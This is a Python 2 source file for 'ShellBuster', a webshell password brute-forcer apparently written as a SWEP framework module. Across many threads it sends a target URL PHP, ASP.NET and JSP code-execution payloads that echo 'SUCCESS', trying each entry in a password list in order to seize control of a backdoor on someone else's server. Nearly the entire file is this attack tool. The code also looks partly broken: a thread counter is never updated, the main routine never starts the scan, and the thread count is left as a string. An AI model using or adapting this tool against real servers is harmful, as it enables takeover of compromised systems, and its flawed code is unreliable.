import requests
import re
import queue
import threading


def info():
    info = {
        'name': 'shell',
        'path': 'WebshellPasswordScanner',
        'fullname': 'SHELLBUSTER SWEP COMPATIABLE',
        'description': 'ShellBuster webshell scanner ver1.0, SWEP compatible',
        'parameters': {
            'url': 'Target URL.',
            'language': '(OPTIONAL) Target language, support php, dotnet, jsp currently. Leave for automatic detection.',
            'passlist': 'Password list.',
            'Thread': 'Threads. Default: 50',
            'Timeout': 'Request timeout. Default: 3'
        },
        'author': 'BREACHER security',
        'date': '2018-12-14'
    }
    return info


class Scanner():
    def __init__(self):
        self.url = None
        self.language = None
        self.passlist = None
        self.Thread = 50
        self.Timeout = 3
        self._Counter = 0
        self._Queue = queue.Queue()
        pass

    def Scan(self):
        if not self.url:
            print '[!] Url not specified.'
        elif not self.language:
            print '[*] Language not provided. Trying identify language'
            ext = re.findall('([a-z]*)?$', self.url)[0]
            if ext in ['php', 'ph3', 'ph4', 'ph5', 'ph6', 'pht', 'phtml', 'php2', 'php3', 'php4', 'php5', 'php6',
                       'php7']:
                self.language = 'php'
            elif ext in ['cer', 'asa', 'asp', 'aspx']:
                self.language = 'dotnet'
            elif ext in ['jsp', 'action', 'jhtml', 'do']:
                self.language = 'jsp'
            else:
                print '[!] Language not specified'
                return
        try:
            for item in open(self.passlist).read().split('\n'):
                self._Queue.put(item)
            print '[*] %s password(s) loaded.' % (str(self._Queue.qsize()))
        except Exception, e:
            print '[!] Failed to load password list: %s' % (str(e))
        try:
            while True:
                if self.Thread > self._Counter:
                    try:
                        thread = threading.Thread(target=self.CheckPassword, args=(self.language, self._Queue.get()))
                        thread.start()
                        if self._Queue.qsize() == 0:
                            thread.join()
                            break
                    except Exception, e:
                        print '[!] Failed to start a thread: %s' % (str(e))
        except Exception, e:
            print '[!] Check password failed: %s' % (str(e))

    def CheckPassword(self, mode, password):
        try:
            if mode == 'jsp':
                resp = requests.post('http://%s?%s=out.println("SUCCESS");' % (self.url, password),
                                     {password: 'out.println("SUCCESS");'}).text
            elif mode == 'dotnet':
                resp = requests.post('http://%s?%s=Response.Write("SUCCESS")' % (self.url, password),
                                     {password: 'Response.Write("SUCCESS")'}).text
            elif mode == 'php':
                resp = requests.post('http://%s?%s=echo("SUCCESS");' % (self.url, password),
                                     {password: 'echo("SUCCESS")'}).text
            else:
                return
            if re.findall('SUCCESS', resp):
                print '[+] Password for %s found: %s' % (self.url, password)
        except requests.HTTPError:
            print '[*] A HTTP Error occured, Starting retry'
            self.CheckPassword(mode, password)
        except requests.ConnectionError:
            print '[*] Failed to connect to http://%s, Please check connection.' % (self.url)
        except Exception, e:
            print '[!] Error checking a password: %s' % (str(e))
        return

    def info(self):
        InformationList = info()
        args = InformationList['parameters']
        print '[*] Incoming scanner information:'
        print '[*] Scanner name: %s' %(InformationList['name'])
        print ' |   %s' %(InformationList['fullname'])
        print ' |   Description: %s' %(InformationList['description'])
        print ' |   Author: %s' %(InformationList['author'])
        print ' |   Date: %s' %(InformationList['date'])
        print ' |   Arguments: Total %i' %(len(args))
        print ' |    |  NAME        DESCRIPTION'
        print ' |    |  ----        -----------'
        for item in args.keys():
            print ' |    |  %s%s' %(item.ljust(12), args[item])
        print ' |'
        print '[*] Scanner information end.'


if __name__ == '__main__':
    Session = Scanner()
    print '[*] Shellbuster 1.0, SWEP Compatible'
    Session.url = raw_input("URL >")
    Session.passlist = raw_input("PASSWORD FILE >")
    thread = raw_input("THREAD >")
    if not thread:
        thread = 50
    Session.Thread = thread
    Session.info()

